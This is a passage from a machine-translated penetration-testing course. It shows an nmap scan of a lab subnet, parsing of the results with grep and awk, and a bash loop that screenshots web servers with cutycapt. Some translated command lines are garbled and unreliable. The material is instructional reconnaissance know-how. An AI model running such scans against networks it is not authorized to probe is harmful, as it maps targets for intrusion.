<div style="position:absolute;top:152952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有点易于管理，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（我们在后面的模块中讨论）作为我们的端口</font></font></nobr></div>
<div style="position:absolute;top:152971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描工具：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:153006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap -A -p80 --open 10.11.1.0/24 -oG nmap-scan_10.11.1.1-254</font></font></font></b></nobr></div>
<div style="position:absolute;top:153023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从美国东部时间 2019-03-18 18:57 开始 Nmap 7.60 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:153040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.8 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:153057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.030 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:153091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务版本</font></font></nobr></div>
<div style="position:absolute;top:153108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 打开 http Apache httpd 2.0.52 ((CentOS))</font></font></nobr></div>
<div style="position:absolute;top:153125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http-方法：</font></font></nobr></div>
<div style="position:absolute;top:153142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 有潜在风险的方法：TRACE</font></font></nobr></div>
<div style="position:absolute;top:153158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http-robots.txt：2 个不允许的条目</font></font></nobr></div>
<div style="position:absolute;top:153175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_/内部/ /tmp/ </font></font></nobr></div>
<div style="position:absolute;top:153192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http-server-header: Apache/2.0.52 (CentOS)</font></font></nobr></div>
<div style="position:absolute;top:153210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http-title: 站点没有标题 (text/html; charset=UTF-8)。</font></font></nobr></div>
<div style="position:absolute;top:153226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:89:20:34 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:153243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：OSScan 结果可能不可靠，因为我们找不到至少 1 个打开的</font></font></nobr></div>
<div style="position:absolute;top:153260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设备类型：通用|WAP|防火墙|代理服务器|PBX</font></font></nobr></div>
<div style="position:absolute;top:153277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在运行（只是猜测）：Linux 2.6.X (92%)、ZoneAlarm 嵌入式 (90%)、Cisco 嵌入式 </font></font></nobr></div>
<div style="position:absolute;top:153294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">激进的操作系统猜测：Linux 2.6.18 (92%)、Linux 2.6.9 (92%)、Linux 2.6.9 - 2.6.27 (90 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:153427;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="130"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 130 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:153460;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:154537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:154537;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:154537;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">130</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:153556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机没有精确的操作系统匹配（测试条件不理想）。</font></font></nobr></div>
<div style="position:absolute;top:153572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络距离：1跳</font></font></nobr></div>
<div style="position:absolute;top:153606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">追踪路线</font></font></nobr></div>
<div style="position:absolute;top:153624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跳 RTT 地址</font></font></nobr></div>
<div style="position:absolute;top:153640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 30.19 毫秒 10.11.1.8</font></font></nobr></div>
<div style="position:absolute;top:153674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.10 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:153691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.030 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:153725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务版本</font></font></nobr></div>
<div style="position:absolute;top:153742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 打开 http Microsoft IIS httpd 6.0</font></font></nobr></div>
<div style="position:absolute;top:153759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http-方法：</font></font></nobr></div>
<div style="position:absolute;top:153776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 有潜在风险的方法：TRACE</font></font></nobr></div>
<div style="position:absolute;top:153793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http-server-header: Microsoft-IIS/6.0</font></font></nobr></div>
<div style="position:absolute;top:153810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http-title: 建设中</font></font></nobr></div>
<div style="position:absolute;top:153827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:89:06:D0 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:153844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：OSScan 结果可能不可靠，因为我们找不到至少 1 个打开的</font></font></nobr></div>
<div style="position:absolute;top:153861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设备类型：通用|WAP</font></font></nobr></div>
<div style="position:absolute;top:153878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行（只是猜测）：Microsoft Windows 2003|XP|2000 (89%)，Apple 嵌入式 (86%)</font></font></nobr></div>
<div style="position:absolute;top:153895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统 CPE: cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe</font></font></nobr></div>
<div style="position:absolute;top:153912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机没有精确的操作系统匹配（测试条件不理想）。</font></font></nobr></div>
<div style="position:absolute;top:153929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络距离：1跳</font></font></nobr></div>
<div style="position:absolute;top:153946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务信息：操作系统：Windows；</font><font style="vertical-align: inherit;">CPE: cpe:/o:microsoft:windows</font></font></nobr></div>
<div style="position:absolute;top:153980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">追踪路线</font></font></nobr></div>
<div style="position:absolute;top:153997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跳 RTT 地址</font></font></nobr></div>
<div style="position:absolute;top:154014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 30.41 毫秒 10.11.1.10</font></font></nobr></div>
<div style="position:absolute;top:154031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:154050;left:256"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 185 - 扫描整个 C 类子网以查找 Web 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:154079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个非常简单的扫描，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-A</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于主动扫描，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于指定端口或端口</font></font></nobr></div>
<div style="position:absolute;top:154099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">范围，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--open</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只与开放口岸返回机器，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-oG</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存在扫描结果</font></font></nobr></div>
<div style="position:absolute;top:154118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grepable 格式。</font><font style="vertical-align: inherit;">同样，如果</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对您来说是新手</font><font style="vertical-align: inherit;">，请不要担心</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们稍后会详细介绍，但是 nmap</font></font></nobr></div>
<div style="position:absolute;top:154138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当然提供了相当数量的输出来使用。</font></font></nobr></div>
<div style="position:absolute;top:154171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出文件，以熟悉一下它的格式为：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:154205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat nmap-scan_10.11.1.1-254</font></font></font></b></nobr></div>
<div style="position:absolute;top:154222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># Nmap 7.60 扫描于 2019 年 3 月 18 日 18:57:48 启动为：nmap -A -p80 --open -oG nmap-s</font></font></nobr></div>
<div style="position:absolute;top:154240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">can_10.11.1.1-254 10.11.1.0/24</font></font></nobr></div>
<div style="position:absolute;top:154256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.8 () 状态：Up</font></font></nobr></div>
<div style="position:absolute;top:154273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.8 () 端口：80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq In</font></font></nobr></div>
<div style="position:absolute;top:154290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dex：197 IP ID Seq：全零</font></font></nobr></div>
<div style="position:absolute;top:154307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.10 () 状态：Up</font></font></nobr></div>
<div style="position:absolute;top:154324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.10 () 端口：80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq 索引：256 </font></font></nobr></div>
<div style="position:absolute;top:154341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP ID Seq：增量</font></font></nobr></div>
<div style="position:absolute;top:154358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.13 () 状态：Up</font></font></nobr></div>
<div style="position:absolute;top:154375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.13 () 端口：80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq 索引：136 </font></font></nobr></div>
<div style="position:absolute;top:154392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP ID Seq：增量</font></font></nobr></div>
<div style="position:absolute;top:154409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:154428;left:248"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 186 - 熟悉 nmap 扫描的结果文件 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:154615;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="131"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 131 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:154648;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:155725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:155725;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:155725;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">131</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:154744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有趣的是，看起来每个IP地址都重复了两次，第一行显示了机器</font></font></nobr></div>
<div style="position:absolute;top:154763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态，第二个显示正在扫描的端口号。</font><font style="vertical-align: inherit;">因为我们只对</font></font></nobr></div>
<div style="position:absolute;top:154782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">唯一的 IP 地址，一些清理是必要的。</font><font style="vertical-align: inherit;">让我们</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含端口</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的行</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:154817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat nmap-scan_10.11.1.1-254 | </font><font style="vertical-align: inherit;">80</font></font></font></b></nobr></div>
<div style="position:absolute;top:154834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># Nmap 7.60 扫描于 2019 年 3 月 18 日 18:57:48 启动为：nmap -A -p80 --open -oG nmap-s</font></font></nobr></div>
<div style="position:absolute;top:154851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">can_10.11.1.1-254 10.11.1.0/24</font></font></nobr></div>
<div style="position:absolute;top:154868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.8 () 端口：80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq In</font></font></nobr></div>
<div style="position:absolute;top:154885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dex：197 IP ID Seq：全零</font></font></nobr></div>
<div style="position:absolute;top:154902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.10 () 端口：80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq 索引：256 </font></font></nobr></div>
<div style="position:absolute;top:154919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP ID Seq：增量</font></font></nobr></div>
<div style="position:absolute;top:154936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.13 () 端口：80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq 索引：136 </font></font></nobr></div>
<div style="position:absolute;top:154953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP ID Seq：增量</font></font></nobr></div>
<div style="position:absolute;top:154970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:154989;left:267"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 187 - 使用 grep 命令在文件中搜索端口 80</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个很好的开始，但请注意第一行是无关紧要的。</font><font style="vertical-align: inherit;">为了排除它，我们将</font><font style="vertical-align: inherit;">再次使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:155039;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，这是一个“反向grep”，仅显示与搜索字符串不匹配的行。</font><font style="vertical-align: inherit;">在这种情况下，</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们不想要任何包含区分大小写的关键字“Nmap”的行：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:155092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat nmap-scan_10.11.1.1-254 | </font><font style="vertical-align: inherit;">grep 80 | </font><font style="vertical-align: inherit;">grep -v "Nmap"</font></font></font></b></nobr></div>
<div style="position:absolute;top:155110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.8 () 端口：80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq In</font></font></nobr></div>
<div style="position:absolute;top:155127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dex：197 IP ID Seq：全零</font></font></nobr></div>
<div style="position:absolute;top:155143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.10 () 端口：80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq 索引：256 </font></font></nobr></div>
<div style="position:absolute;top:155160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP ID Seq：增量</font></font></nobr></div>
<div style="position:absolute;top:155177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.1.13 () 端口：80/open/tcp//http//Microsoft IIS httpd 5.1/ Seq 索引：136 </font></font></nobr></div>
<div style="position:absolute;top:155194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP ID Seq：增量</font></font></nobr></div>
<div style="position:absolute;top:155211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:155231;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 188 - 排除任何匹配 Nmap 关键字的行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的输出看起来好多了。</font><font style="vertical-align: inherit;">让我们尝试只提取 IP 地址，因为这就是我们的全部内容</font></font></nobr></div>
<div style="position:absolute;top:155279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的很感兴趣。为此，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印第二个字段，使用</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">T</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为分隔符：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:155314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat nmap-scan_10.11.1.1-254 | </font><font style="vertical-align: inherit;">grep 80 | </font><font style="vertical-align: inherit;">grep -v "Nmap" | </font><font style="vertical-align: inherit;">awk '{打印</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:155331;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$2}'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:155348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.8</font></font></nobr></div>
<div style="position:absolute;top:155365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.10</font></font></nobr></div>
<div style="position:absolute;top:155382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.13</font></font></nobr></div>
<div style="position:absolute;top:155399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.14</font></font></nobr></div>
<div style="position:absolute;top:155416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.22</font></font></nobr></div>
<div style="position:absolute;top:155433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.24</font></font></nobr></div>
<div style="position:absolute;top:155450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.31</font></font></nobr></div>
<div style="position:absolute;top:155467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.39</font></font></nobr></div>
<div style="position:absolute;top:155484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.49</font></font></nobr></div>
<div style="position:absolute;top:155501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.50</font></font></nobr></div>
<div style="position:absolute;top:155518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.71</font></font></nobr></div>
<div style="position:absolute;top:155535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:155554;left:267"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 189 - 使用 awk 命令打印 IP 地址列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的。</font><font style="vertical-align: inherit;">这看起来像一个干净的 IP 地址列表。</font><font style="vertical-align: inherit;">下一步，我们将使用 Bash one-liner 来循环</font></font></nobr></div>
<div style="position:absolute;top:155603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过上面的 IP 列表并运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cutycapt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">133</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个 Qt WebKit 网页渲染捕获</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:155675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">133 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（CutyCapt，2013 年），http://cutycapt.sourceforge.net/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:155803;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="132"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 132 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:155836;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:156913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:156913;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:156913;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">132</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公用事业。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">–url</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定目标网站，并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">–out</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定输出的名称</font></font></nobr></div>
<div style="position:absolute;top:155951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:155986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" |</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:156003;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk '{print $2}'); </font><font style="vertical-align: inherit;">做 cutycapt --url=$ip --out=$ip.png;done</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:156022;left:251"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 190 - 使用 cutycapt 从所有 Web 服务器捕获屏幕截图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:156052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们的循环完成并且我们有一个提示，我们可以检查输出文件的列表</font></font></nobr></div>
